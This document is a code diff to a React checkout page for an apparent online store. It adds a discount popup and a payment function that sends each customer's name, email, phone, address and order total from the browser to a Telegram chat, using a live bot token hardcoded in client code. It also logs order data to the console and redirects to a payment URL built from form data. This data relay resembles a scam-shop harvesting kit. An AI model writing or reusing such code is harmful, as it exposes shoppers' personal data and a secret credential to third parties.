@@ -57,6 +57,7 @@ export default function CheckoutPage() {
   const [discountApplied, setDiscountApplied] = useState(false)
   const [showPassword, setShowPassword] = useState(false)
   const [showConfirmPassword, setShowConfirmPassword] = useState(false)
+  const [showDiscountPopup, setShowDiscountPopup] = useState(false)
 
   // Telegram configuration
   const TELEGRAM_BOT_TOKEN = '8535669526:AAHjGvoXJv5HwdDDr6jl8eTFeWa4DyTe4lg'
@@ -149,11 +150,177 @@ export default function CheckoutPage() {
       setAccountCreated(true)
       setIsCreatingAccount(false)
       setShowAccountForm(false)
+      proceedWithPayment()
     })
     .catch(function() {
       setAccountError(isFr ? "Erreur lors de la création du compte" : "Error creating account")
       setIsCreatingAccount(false)
     })
+  }
+
+  const handleGetDiscount = () => {
+    setShowDiscountPopup(false)
+    setShowAccountForm(true)
+    // Scroll to account form
+    setTimeout(() => {
+      document.getElementById('account-section')?.scrollIntoView({ behavior: 'smooth' })
+    }, 100)
+  }
+
+  const handleSkipDiscount = () => {
+    setShowDiscountPopup(false)
+    // Continue with original checkout process
+    proceedWithPayment()
+  }
+
+  const proceedWithPayment = async () => {
+    // Move all the payment processing code here
+    setIsProcessing(true)
+
+    // TikTok: Identify user + AddPaymentInfo + PlaceAnOrder events
+    const contents = items.map(item => ({
+      content_id: item.id,
+      content_type: 'product',
+      content_name: item.name,
+      price: Number(item.price) || 0,
+      quantity: Number(item.quantity) || 1,
+    }))
+    const ttUser = { email: formData.email, phone: formData.phone }
+    const fbUser = { email: formData.email, phone: formData.phone }
+    ttqIdentify({ email: formData.email, phone: formData.phone })
+    fbqIdentify({ email: formData.email, phone: formData.phone })
+
+    // AddPaymentInfo
+    const apiEventId = `api_${Date.now()}`
+    ttqTrack('AddPaymentInfo', { value: Number(finalTotal) || 0, currency: 'CAD', contents })
+    fetch('/api/tiktok-event', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        event: 'AddPaymentInfo',
+        event_id: apiEventId,
+        properties: { value: Number(finalTotal) || 0, currency: 'CAD', contents },
+        user: ttUser,
+      }),
+    }).catch(() => {})
+    fbqTrack('AddPaymentInfo', {
+      content_ids: items.map(item => item.id),
+      content_type: 'product',
+      contents: items.map(item => ({
+        id: item.id,
+        quantity: item.quantity,
+        item_price: Number(item.price) || 0,
+      })),
+      value: Number(finalTotal) || 0,
+      currency: 'CAD',
+    })
+
+    // TikTok PlaceAnOrder (not a standard Meta event)
+    const poEventId = `po_${Date.now()}`
+    ttqTrack('PlaceAnOrder', { value: Number(finalTotal) || 0, currency: 'CAD', contents })
+    fetch('/api/tiktok-event', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        event: 'PlaceAnOrder',
+        event_id: poEventId,
+        properties: { value: Number(finalTotal) || 0, currency: 'CAD', contents },
+        user: ttUser,
+      }),
+    }).catch(() => {})
+    
+    // Generate unique Order ID
+    const orderNumber = `BC-${Math.floor(Date.now() / 1000).toString(36).toUpperCase().slice(-5)}-${Math.floor(Math.random() * 900 + 100)}`
+    
+    // Store order data in localStorage for tracking
+    const orderData = {
+      orderNumber,
+      customerInfo: formData,
+      items: items,
+      total: total,
+      discountAmount: discountAmount,
+      discountedTotal: discountedTotal,
+      tax: taxes,
+      finalTotal: finalTotal,
+      orderDate: new Date().toISOString(),
+      status: 'processing',
+      sessionId: sessionIdRef.current
+    }
+    
+    console.log('=== SAVING ORDER DATA ===')
+    console.log('Order Number:', orderNumber)
+    console.log('Order Data:', orderData)
+    console.log('localStorage key:', `order_${orderNumber}`)
+    
+    try {
+      localStorage.setItem(`order_${orderNumber}`, JSON.stringify(orderData))
+      localStorage.setItem('bettercleans-latest-order', orderNumber)
+      const emailKey = `bettercleans-orders-${formData.email.toLowerCase()}`
+      const existingOrders = JSON.parse(localStorage.getItem(emailKey) || '[]')
+      existingOrders.push(orderNumber)
+      localStorage.setItem(emailKey, JSON.stringify(existingOrders))
+      console.log('Order data saved to localStorage')
+    } catch (error) {
+      console.error('Error saving to localStorage:', error)
+    }
+
+    // Save to Supabase for cross-device access
+    try {
+      await saveOrder({
+        order_number: orderNumber,
+        email: formData.email.toLowerCase(),
+        first_name: formData.firstName,
+        last_name: formData.lastName,
+        address: formData.address,
+        apartment: formData.apartment || '',
+        city: formData.city,
+        province: formData.province,
+        postal_code: formData.postalCode,
+        country: formData.country,
+        phone: formData.phone,
+        items: items,
+        total: total,
+        tax: taxes,
+        final_total: finalTotal,
+        order_date: new Date().toISOString(),
+        status: 'processing',
+        email_stage: 1,
+        locale: locale,
+      })
+      console.log('Order saved to Supabase')
+    } catch (error) {
+      console.error('Error saving to Supabase:', error)
+    }
+    
+    // Send final update to Telegram with Order ID
+    var msg = `📦 *ORDER PLACED!* 🛒\n\n`
+            + `🆔 Order ID: ${orderNumber}\n`
+            + `👤 Customer: ${formData.firstName} ${formData.lastName}\n`
+            + `📧 Email: ${formData.email}\n`
+            + `📞 Phone: ${formData.phone}\n`
+            + `🏠 Address: ${formData.address}, ${formData.city}, ${formData.province} ${formData.postalCode}\n`
+            + `💰 Total: $${finalTotal.toFixed(2)} CAD\n`
+            + `📦 Items: ${items.length} item(s)\n`
+            + `🎯 Session: ${sessionIdRef.current}\n`
+            + `🕐 Time: ${new Date().toLocaleString('fr-CA')}\n\n`
+            + `🔗 Redirecting to payment system...`
+
+    fetch("https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage", {
+      method: "POST",
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: msg,
+        parse_mode: 'Markdown'
+      })
+    }).catch(() => {})
+
+    // Generate payment URL and redirect
+    const paymentURL = generatePaymentURL(formData)
+    console.log('=== PAYMENT URL GENERATED ===')
+    console.log('Payment URL:', paymentURL)
+    
+    window.location.href = paymentURL
   }
 
   // Province tax rates
@@ -523,6 +690,12 @@ LAST UPDATE:
       return
     }
 
+    // Check if user wants discount before proceeding
+    if (!accountCreated && !discountApplied) {
+      setShowDiscountPopup(true)
+      return
+    }
+
     // Verify Turnstile server-side (invisible mode)
     if (turnstileToken) {
       try {
@@ -823,7 +996,7 @@ LAST UPDATE:
 
                 {/* Account Creation Section */}
                 {!accountCreated && (
-                  <div className="mt-4">
+                  <div id="account-section" className="mt-4">
                     <div className="bg-gradient-to-r from-green-50 to-emerald-50 border border-green-200 rounded-xl p-4">
                       <div className="flex items-center justify-between">
                         <div className="flex-1">
@@ -1416,6 +1589,53 @@ LAST UPDATE:
           </div>
         </div>
       </div>
+    </div>
+
+    <Footer />
+
+      {/* Discount Popup */}
+      {showDiscountPopup && (
+        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
+          <div className="bg-white rounded-2xl shadow-2xl max-w-md w-full p-6 transform transition-all duration-300 scale-100">
+            <div className="text-center">
+              <div className="w-16 h-16 bg-gradient-to-r from-green-500 to-emerald-500 rounded-full flex items-center justify-center mx-auto mb-4">
+                <span className="text-white text-2xl font-bold">$5</span>
+              </div>
+              
+              <h3 className="text-xl font-bold text-gray-900 mb-2">
+                {isFr ? 'Économisez $5 instantanément !' : 'Save $5 instantly!'}
+              </h3>
+              
+              <p className="text-gray-600 mb-6">
+                {isFr 
+                  ? 'Êtes-vous sûr de vouloir économiser $5 sur cette commande ? Créez un compte en 30 secondes et obtenez votre rabais immédiatement.'
+                  : 'Are you sure you want to save $5 on this order? Create an account in 30 seconds and get your discount immediately.'
+                }
+              </p>
+              
+              <div className="space-y-3">
+                <button
+                  onClick={handleGetDiscount}
+                  className="w-full bg-gradient-to-r from-green-600 to-emerald-600 text-white py-3 px-6 rounded-xl font-semibold hover:from-green-700 hover:to-emerald-700 transition-all duration-200 shadow-lg"
+                >
+                  {isFr ? 'Oui, je veux économiser $5 !' : 'Yes, I want to save $5!'}
+                </button>
+                
+                <button
+                  onClick={handleSkipDiscount}
+                  className="w-full bg-gray-100 text-gray-700 py-3 px-6 rounded-xl font-medium hover:bg-gray-200 transition-colors duration-200"
+                >
+                  {isFr ? 'Non, continuer sans rabais' : 'No, continue without discount'}
+                </button>
+              </div>
+              
+              <p className="text-xs text-gray-500 mt-4">
+                {isFr ? 'Aucun spam. Promis.' : 'No spam. Promise.'}
+              </p>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   )
 }
